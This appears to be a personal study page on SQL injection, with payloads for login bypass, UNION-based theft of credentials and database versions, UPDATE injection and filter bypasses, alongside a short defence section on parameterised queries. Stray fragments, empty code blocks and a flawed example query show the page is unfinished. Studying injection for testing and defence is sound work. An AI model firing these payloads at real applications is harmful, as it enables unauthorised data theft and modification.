# SQL-Injection

## Introduction

[PortSwigger](https://portswigger.net/web-security/sql-injection) states that: *"SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database."* SQL injection as technique is used by attacker to execute malicious SQL statements with the objective of stealing information and credentials, modifying the database or command execution from the context of database interacting with other networked components. [PortSwigger](https://portswigger.net/web-security/sql-injection) states also that  *"In some situations, an attacker can escalate a SQL injection attack to compromise the underlying server or other back-end infrastructure. It can also enable them to perform denial-of-service attacks."* For introductory material about SQL see [[Introduction-to-SQL]], if you just here for [[SQLmap-CheatSheet]] then follow the latter link.

The injection happens because we are adding a `'` *modifying* the query   
```sql
-- Example raw query to understand SQL
SELECT * FROM users WHERE username = {input_user} AND password {input_password}
--  Which normally if the admin login in would populate {} as:
SELECT * FROM users WHERE username = 'admin' AND 
'admin123verystrongadminpassword'
-- But when we break the syntax as shown by the syntax highlighting:
SELECT * FROM users WHERE username = 'admin'' OR 1=1 -- - AND 
'justguessingthepasswordtofillthisfieldin'
```
We are then controlling what the parse then parses next that being the logic of if username is admin and one equals one then return `true`. We are injected some logic for the parser to do instead checking the password.

Due to the *core features of the SQL language are implemented in the same way across popular database platforms, and so many ways of detecting and exploiting SQL injection vulnerabilities work identically on different types of database.* [PortSwigger](https://portswigger.net/web-security/sql-injection)

An terrible ode to SQLI:
```text
title: Sleepy-Questions-Language-Idea 'behind attack=attack -- - 

sqlin' da morning 
sqlin' your evening
admin or one plus one equals two 
single quote for strings  
dash dash space dash dont forget to URL encode things
enum db char-by-char for those correct
tingles as the database query dumps things to you
comments breaking stuff on the internet
admin password from table * select
database asleep pleasing indicates a blind false or true
SELECT star FROM passwords stealing 
by 7ru7h
```

#### Practice Locations

For possibly the best hand-on-lab on the internet see [TryHackMe SQL injections Labs room](https://tryhackme.com/room/sqlilab), it has a good curve to the challenges and has a guidance feature so that in browser you can see what SQL query you sent. 

#### Use cases for SQLi 

1. Authentication Bypass
1. Enumerating a Database `SELECT <field>, <field> FROM <table> WHERE <field>=`
	1. Column Number Enumeration - With column names or the column indexes instruct database to sort by either, to figure out the width:
		`http://url/bad.ext?<field>=1 order by 1`
	1. Determine Output layout - Union statement to control display, for meaningful Data extraction
		`union all select 1, 2, <nth, column, width, delimitered, with , comma>`
1. Data Extraction
1. SQLi to Code Execution

## Typology 

Topological distinctions:
- Visibility
	- **Reflected** SQL injection 
		- Response containing the result return to the attacker as a response
		- With non Blind SQLi there is some form of extracted data:
			- Cookies
			- Field Display in HTML
	- **Blind** SQL injection - use `sqlmap` if you can or create a client to automate payloads 
		- When a vulnerable application's responses are never returned and behaviour is inferred either with boolean or time-based logic:
			- Time-based blind SQL injections
			- Boolean-based blind SQL injections
- Affect 
	- **In-Band** SQL injection:
		- When a vulnerable application *on the same channel used by the attack* produces both the:
			- Result of the query
			- Application-returned value
			- Find number of columns -> Check suitable columns -> Attack
	- **Out-of-Band** SQL injection: 
		- When a vulnerable application is forced to respond over different channel than the original.
- Syntax location 
	- **First-Order** SQL injection:
		-  [PortSwigger](https://portswigger.net/web-security/sql-injection): *First-order SQL injection occurs when the application processes user input from an HTTP request and incorporates the input into a SQL query in an unsafe way.*
	- **Second-Order** SQL injection: 
		-  [PortSwigger](https://portswigger.net/web-security/sql-injection):   *Second-order SQL injection occurs when the application takes user input from an HTTP request and stores it for future use*
	- Either could be in a syntax locale - [PortSwigger](https://portswigger.net/web-security/sql-injection):  
		- *"Most SQL injection vulnerabilities occur within the `WHERE` clause of a `SELECT` query."*
		- In `UPDATE` statements, within the updated values or the `WHERE` clause.
		- In `INSERT` statements, within the inserted values.
		- In `SELECT` statements, within the table or column name.
		- In `SELECT` statements, within the `ORDER BY` clause.
- Examples for Context
	- [PortSwigger]:
		- [Retrieving hidden data](https://portswigger.net/web-security/sql-injection#retrieving-hidden-data), where you can modify a SQL query to return additional results.
		- [Subverting application logic](https://portswigger.net/web-security/sql-injection#subverting-application-logic), where you can change a query to interfere with the application's logic.
		- [UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks), where you can retrieve data from different database tables.
		- [Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind), where the results of a query you control are not returned in the application's responses.

Union

Enumerate Columns 
```sql
-- Assume no use of quote in payloads below for syntax highlighting ' SQL STATEMENT  

-- -- Check Columns with ORDER BY or..
ORDER BY 1--
ORDER BY 2--
ORDER BY 3--
-- -- ..or check with UNIOIN SELECT NULL ... statements
UNION SELECT NULL-- 
UNION SELECT NULL,NULL-- 
UNION SELECT NULL,NULL,NULL--
-- ..or GROUP BY
GROUP BY 1--+UNION ALL SELECT notes
GROUP BY 2--+
GROUP BY 3--+


-- *On Oracle, every `SELECT` query must use the `FROM` keyword and specify a valid table. There is a built-in table on Oracle called `dual` which can be used for this purpose.*

UNION SELECT NULL FROM DUAL--
```

Enumerate column with useful data types
```sql
-- Assume no use of quote in payloads below for syntax highlighting ' SQL STATEMENT  
UNION SELECT 'a',NULL,NULL,NULL-- 
UNION SELECT NULL,'a',NULL,NULL-- 
UNION SELECT NULL,NULL,'a',NULL-- 
UNION SELECT NULL,NULL,NULL,'a'--`
```

Get that interesting data.
```sql
-- Assume no use of quote in payloads below for syntax highlighting ' SQL STATEMENT  
UNION SELECT username, password FROM users--
--  Retrieving multiple values within a single column
UNION SELECT username || '~' || password FROM users--
```


```sql
UNION ALL SELECT group_concat(column_name),null,..NUMBERTOTABLES..,null FROM information_schema.columns WHERE table_name="TABLETHEPAGEISREFLECTING"
```

```html
<!-- URL shows ID endpoint -->
http://website/about/0'
<!-- Beware how the application is handling the query --> 
http://website/about/0 UNION ... <!-- No need for quotes or comments -->
```

## Methodology

>**BEWARE** Boolean-based Blind injections are tedious and time-consuming, use fuzzing or script

>**BEWARE** Nested functionality of i.e Registering a User and then as an Authenticated Users the Username is a SQLi on another section of the website. [[SQLmap-CheatSheet]] may require a tamper script with `--tamper tamper.py` to create a user and then exploit the target page.

>**BEWARE** If your condition reaches an `UPDATE` or `DELETE` statement you may cause data loss!

Invaluable Payloads up-to-date payload listings can be found
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [Payloadbox](https://github.com/payloadbox/sql-injection-payload-list)

Indication of vulnerability: 
- Variations with use of  `'` which used a string delimiter. 
- [PortSwigger](https://portswigger.net/web-security/sql-injection): *"Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses."*
- Payload considerations:
	- Time differences if using `sleep` or others
	- Monitor out-of-band network interaction (communicate back to your box enjoy a good `tcpdump`)

Consider 
- [[SQLmap-CheatSheet]]

Databases require instructional commands to store, organise and interact with data. 
1. The requirement is to inject malformed SQL queries to break the query syntax through a logical mechanism and the SQL parser's interpretation of characters external usage in token classification.  
	- The `-` comment  character is recognised as a break from a functionality to interact with database. 
	- Or `'` to indicate the opening of string declaration. The paring functions to consider the following set of character as string continuously until otherwise stated. 
2. A) In breaking the query, access to debug messages or likewise indicated through commanding the server to delay its subsequent response demonstrating control of the server.
2. B) Beware quote and comments may not be necessary based on how and the location  (when and where in) the application it is handling the query at some point.    
	1.  the the SQL query at different place in the  
3. Enumerate the database type and version
	- Error messages
	- Profiling SQL Language features 
		- Syntax for string concatenation.
		- Comments.
		- Batched (or stacked) queries.
		- Platform-specific APIs.
		- Error messages.
4. If it will `sleep` because a malicious query states such for a specified length of time 
	- Then query may be transformed to the fix its breakage of syntax to 
		- Then query actual information on the database. 
			- [[FFUF-Cheatsheet]] maybe useful in fuzzing fields of the database.
		- Or use the system hosting the database to use the database as storage for further movement with commands to code execution. 
5. Nested SQL
	- *A useful function in SQL is creating a query within a query, also known as a subquery or nested query. A nested query is a SELECT statement that is typically enclosed in parentheses, and embedded within a primary SELECT , INSERT , or DELETE operation.* [DigitalOcean Nest SQL](https://www.digitalocean.com/community/tutorials/how-to-use-nested-queries)
	- [Coderwall Nested SQLi](https://coderwall.com/p/dnf8sa/nested-sql-injections)
6. If there are multiple fields is there second order injection with `'\''` and `'"'` to generate a error, have do so for each? - [PortSwigger Second Order SQLi](https://portswigger.net/kb/issues/00100210_sql-injection-second-order)

Al second order injections
- Figure out which field has a possibility of second order injection with `'\''` and `'"'` to generate a error.

- [HTTP SQL Fiddle](http://sqlfiddle.com/) - beware that this site does not support HTTPS [source code does have Docker](https://github.com/zzzprojects/sqlfiddle3)
- [MySQL comparison](https://dev.mysql.com/doc/refman/8.0/en/comparison-operators.html)


# UPDATE INCOMING DIVERGE PAGE TO CHEATSHEET

Combine everything fitting for a Cheatsheet with
- https://portswigger.net/web-security/sql-injection/cheat-sheet
- PayloadAllTheThings
- HackTricks

#### Characters, Command and Considerations Toolset

> Always consider the differ syntax and language features with enumeration!

MariaDB specifics, but for extensive information for see [[MariaDB-Hacking]]
```sql
;#	-- Ends querysUNION ALL SELECT notes
LIMIT 1	-- Limit number of records returned
```

MSSQL specifics, but for extensive information for see [[MSSQL-Hacking]] 
```mssql

```

MySQL specifics, but for extensive information for see [[MySQL-Cheatsheet]] [[MySQL-Hacking]]
```sql

```

sqlite specifics, but for extensive information for see [[SQLite-Hacking]] [[SQLite-Cheatsheet]]
```sql

```

Database type enumeration
```sql
MySQL and MSSQL
',INPUT=@@version,INPUT='
# Oracle
',INPUT=(SELECT banner FROM v$version),email='
# For SQLite
',INPUT=sqlite_version(),INPUT='
```


#### Use-full Language Features 

Useful feature categorised by use case are featured here to provide are pointer of more that just more commonly used syntax that stereotypes a lot of explanations about SQLi.
UNION ALL SELECT notes
Aggregation functions that concatenate non-null value in a column have utility in retrieval  of data; some language variants:
- MySQL and SQLite  `GROUP_CONCAT()` function returns a string with concatenated non-NULL value from a group.
- PostgreSQL and SQL Server have similar functions called `STRING_AGG()`


## Attack Vectors

#### Input Boxes 

Input Box Non-String - Parameter expects an integer
```sql
1 or 1=1-- -
```

Input Box String- Parameter expects a string
```sql
admin' or '1'='1'-- -
```

#### URL and POST Injection
Consider
```javascript
// Client side controls
function validateform() {
    var profileID = document.inputForm.profileID.value;
    var password = document.inputForm.password.value;

    if (/^[a-zA-Z0-9]*$/.test(profileID) == false || /^[a-zA-Z0-9]*$/.test(password) == false) {
        alert("The input fields cannot contain special characters");
        return false;
    }
    if (profileID == null || password == null) {
        alert("The input fields cannot be empty.");
        return false;
    }
}
```

URL Injection - URL bar in Browser!
```html
<!-- URL shows URL parameters -->
http://website/login?profileID=a&password=a 
<!-- Client Validation bypass, by going directly to URL  -->
http://website/login?profileID=-1' or 1=1-- -&password=a
<!-- URL encode -->
http://website/login?profileID=-1%27%20or%201=1--%20-&password=a 
```

POST Injection - POST request has data 
```html
POST /login <!-- POST request -->
Host: website
...
Referer: website
<!-- Newline goes here, below is the data -->
profileID=-1' or 1=1-- -&password=a
```

#### UPDATE statement
SQLi on UPDATE can modify database **BEWARE**
```html
<!-- html form -->
<input type="text" class="form-control" placeholder "Username" id="username" value="">
...
<input type="text" class="form-control" placeholder "Email" id="email" value="">
...
<input type="text" class="form-control" placeholder "Password" id="password" value="">
```

Enumerate with:
```sql
-- BEWARE this is a template for the above not a payload
-- consider what information the database to frontend pipeline displays
asd',username='test',email='hacked
-- Enumeration is done to gather information of:
-- Correct column names; some might not be visuable, if wrong column names it wont update
-- Then we use these columns to get data back from the database inplace of intend information
-- MySQL and MSSQL
',username=@@version,email='
-- For Oracle
',username=(SELECT banner FROM v$version),email='
-- For SQLite
',username=sqlite_version(),email='
-- Then use targeted database's SQL variant -> tablename -> target table's fields -> data
```


Bypass Filters for `,`  for SQL from  [SQL Injecting Beyond Strict Filters - Union Without Comma - YouTube](https://www.youtube.com/watch?v=61kf4CEnOZk). 
```sql
(SELECT * FROM (SELECT 1) AS A JOIN (SELECT 2) AS B JOIN (SELECT 3) AS C))
```
The issue with SQL injection with `AS X JOIN` introduces the potential bad character  `*`. 

## Blind SQL Injection


[PortSwigger](https://portswigger.net/web-security/sql-injection/blind) states *"Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors."*

[PortSwigger](https://portswigger.net/web-security/sql-injection)
- You can change the logic of the query to trigger a detectable difference in the application's response depending on the truth of a single condition. This might involve injecting a new condition into some Boolean logic, or conditionally triggering an error such as a divide-by-zero.
- You can conditionally trigger a time delay in the processing of the query. This enables you to infer the truth of the condition based on the time that the application takes to respond.
- You can trigger an out-of-band network interaction, using OAST techniques. This technique is extremely powerful and works in situations where the other techniques do not. Often, you can directly exfiltrate data via the out-of-band channel. For example, you can place the data into a DNS lookup for a domain that you control.

## Second Order Injections

[PortSwigger](https://portswigger.net/kb/issues/00100210_sql-injection-second-order) states: *"SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query."* [PortSwigger](https://portswigger.net/web-security/sql-injection) compares: *"First-order SQL injection occurs when the application processes user input from an HTTP request and incorporates the input into a SQL query in an unsafe way."* Whereas *"Second-order SQL injection occurs when the application takes user input from an HTTP request and stores it for future use."*

Examples:
- `UPDATE`-ing the database and then with different HTTP request retrieves the stored data and incorporates it into a SQL query in an unsafe way. 

## Defence and Mitigation

- Use Parameterised queries [PortSwigger terms as parameterized queries](https://portswigger.net/web-security/sql-injection), but also called [Prepared Statements](https://en.wikipedia.org/wiki/Prepared_statement) , example from PortSwigger:

Concatenated input:
```sql
String query = "SELECT * FROM products WHERE category = '"+ input + "'"; Statement statement = connection.createStatement(); ResultSet resultSet = statement.executeQuery(query);
```
Parameterized query:
```sql
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?"); statement.setString(1, input); ResultSet resultSet = statement.executeQuery();
```

From [PortSwigger Issues:](https://portswigger.net/kb/issues/00100200_sql-injection)
- Stored procedures for database access.
- Double up any single quotation marks appearing within user input before incorporating that input into a SQL query.

## References

[PortSwigger](https://portswigger.net/web-security/sql-injection)
[PortSwigger Issues](https://portswigger.net/kb/issues/00100200_sql-injection)
[Prepared Statements Wiki](https://en.wikipedia.org/wiki/Prepared_statement)
[TryHackMe SQLinjections Labs room](https://tryhackme.com/room/sqlilab)
[Computerphile Video](https://www.youtube.com/watch?v=ciNHn38EyRc)
[payloadbox/sql-injection-payload-list](https://github.com/payloadbox/sql-injection-payload-list
[PayloadsAllTheThings/](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
[MYSQL Group_Concat](https://www.w3resource.com/mysql/aggregate-functions-and-grouping/aggregate-functions-and-grouping-group_concat.php)
[SQLite Group_Concat](https://www.sqlitetutorial.net/sqlite-group_concat/)
[DigitalOcean Nest SQL](https://www.digitalocean.com/community/tutorials/how-to-use-nested-queries)
[Coderwall Nested SQLi](https://coderwall.com/p/dnf8sa/nested-sql-injections)
[PortSwigger Second Order SQLi](https://portswigger.net/kb/issues/00100210_sql-injection-second-order)
[SQL Injecting Beyond Strict Filters - Union Without Comma - YouTube](https://www.youtube.com/watch?v=61kf4CEnOZk)
[PortSwigger Blind SQLi](https://portswigger.net/web-security/sql-injection/blind) 